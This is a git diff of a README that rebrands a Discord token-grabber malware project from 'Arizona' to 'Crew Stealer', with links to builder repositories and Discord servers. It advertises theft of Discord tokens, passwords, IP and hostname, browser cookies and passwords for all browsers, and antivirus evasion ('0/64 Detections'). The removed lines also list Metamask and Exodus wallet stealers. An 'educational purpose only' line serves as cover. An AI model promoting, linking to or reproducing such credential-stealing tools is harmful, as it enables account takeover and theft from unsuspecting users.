@@ -1,18 +1,15 @@
-**this grabber wasn't made by me i'm just reposting**
-##### [🌍 Discord Server](https://discord.gg/wEpw66CAMF) -  [:gem: Premium](https://discord.gg/wEpw66CAMF) - [🔧 Builder](https://github.com/rushscriptz/Arizona-Grabber) - [💡 Features](https://github.com/rushscriptz/Arizona-Grabber/edit/main/README.md#features) 
+##### [🌍 Discord Server](https://discord.gg/BedVz5VdwS) - [🕷 Builder](https://github.com/suttonpt/Crew-Stealer-Token-Grabber) - [💡 Features](https://github.com/rushscriptz/Arizona-Grabber/edit/main/README.md#features) 
 
-# Arizona (by Brooklyn inc)
-The new modern discord token grabber & token stealer, with discord password & token even when it changes (old. PirateStealer)
+# Crew Stealer (by Sutton and diazz)
+The new modern discord token grabber & token stealer, with discord password & token even when it changes 
 
 # Terms
 - [x] Educational purpose only
 - [x] Reselling is forbidden
-- [ ] You can use the source code if you keep credits (in embed + in markdown), it has to be open-source
 - [x] We are NOT responsible of anything you do with our software (if its illegal)
 
 # Features
-- QRCode logger 
-- Discord Login Stealer
+- Discord Login 
   - Username
   - ID
   - Token
@@ -27,13 +24,6 @@ The new modern discord token grabber & token stealer, with discord password & to
 - IP
 - Computer Hostname
 - Instantly logout
-- Disable QR
-- Custom embed
-- Cool code structure
-- Cookies (💎)
-- Password (💎)
-- Cookie Automatic Logger (💎)
-- Metamask stealer (💎)
-- Exodus stealer (💎)
-- Anti-Delete & Anti-Spam (💎)
-- 0/64 Detections (💎)
+- Cookies (🧙🏽‍♂️)
+- Passwords for all browsers (🧙🏽‍♂️)
+- 0/64 Detections (🧙🏽‍♂️)
